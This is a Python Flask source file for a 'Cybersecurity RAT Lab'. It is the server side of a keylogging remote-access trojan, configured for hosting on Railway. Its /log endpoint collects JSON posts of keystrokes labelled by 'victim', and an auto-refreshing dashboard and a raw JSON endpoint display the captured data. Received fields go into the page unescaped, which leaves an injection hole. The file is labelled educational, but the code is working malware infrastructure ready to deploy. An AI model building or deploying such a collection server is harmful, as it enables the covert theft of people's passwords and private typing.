from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

# Store data in memory
received_data = []

@app.route('/')
def home():
    """Main dashboard"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cybersecurity RAT Lab</title>
        <style>
            body { font-family: Arial; margin: 40px; }
            h1 { color: #333; }
            .entry { background: #f0f0f0; padding: 15px; margin: 10px 0; border-radius: 5px; }
            .keystrokes { font-family: monospace; background: #fffacd; padding: 10px; }
        </style>
        <meta http-equiv="refresh" content="3">
    </head>
    <body>
        <h1>🔐 Cybersecurity RAT Lab</h1>
        <p><em>Educational Purpose Only</em></p>
        <hr>
        <h3>📊 Collected Data:</h3>
    '''
    
    if received_data:
        for item in received_data[-10:]:  # Show last 10
            html += f'''
            <div class="entry">
                <strong>💻 {item.get('victim', 'Unknown')}</strong><br>
                <div class="keystrokes">⌨️ {item.get('keystrokes', 'No data')}</div>
                <small>🕒 {item.get('timestamp', 'Unknown time')}</small>
            </div>
            '''
    else:
        html += '<p><em>No data received yet. Run client to send data.</em></p>'
    
    html += f'''
        <hr>
        <p><strong>Total entries:</strong> {len(received_data)}</p>
        <p><a href="/test">Test Connection</a> | <a href="/raw">Raw JSON</a></p>
    </body>
    </html>
    '''
    return html

@app.route('/log', methods=['POST', 'GET'])
def log():
    """Receive data from clients - ACCEPTS BOTH POST AND GET"""
    if request.method == 'POST':
        try:
            data = request.json
            if not data:
                return jsonify({"error": "No JSON data received"}), 400
            
            data['received_at'] = datetime.now().isoformat()
            received_data.append(data)
            
            print(f"✅ RECEIVED from {data.get('victim', 'Unknown')}")
            print(f"   Keystrokes: {data.get('keystrokes', 'None')[:50]}...")
            
            return jsonify({
                "status": "success",
                "message": f"Data received from {data.get('victim', 'Unknown')}",
                "total": len(received_data)
            })
        except Exception as e:
            print(f"❌ Error: {e}")
            return jsonify({"error": str(e)}), 500
    else:
        # GET request - show info
        return jsonify({
            "endpoint": "/log",
            "method": "POST",
            "description": "Send JSON data to this endpoint",
            "total_entries": len(received_data)
        })

@app.route('/test')
def test():
    """Simple test endpoint"""
    return jsonify({
        "status": "online",
        "service": "Cybersecurity RAT Server",
        "timestamp": datetime.now().isoformat(),
        "total_data": len(received_data),
        "port": os.environ.get("PORT", "unknown")
    })

@app.route('/raw')
def raw():
    """Return all received data as JSON"""
    return jsonify(received_data)

@app.route('/clear')
def clear():
    """Clear all data (for testing)"""
    received_data.clear()
    return "All data cleared"

# IMPORTANT: Railway needs this exact format
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    print(f"🚀 Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
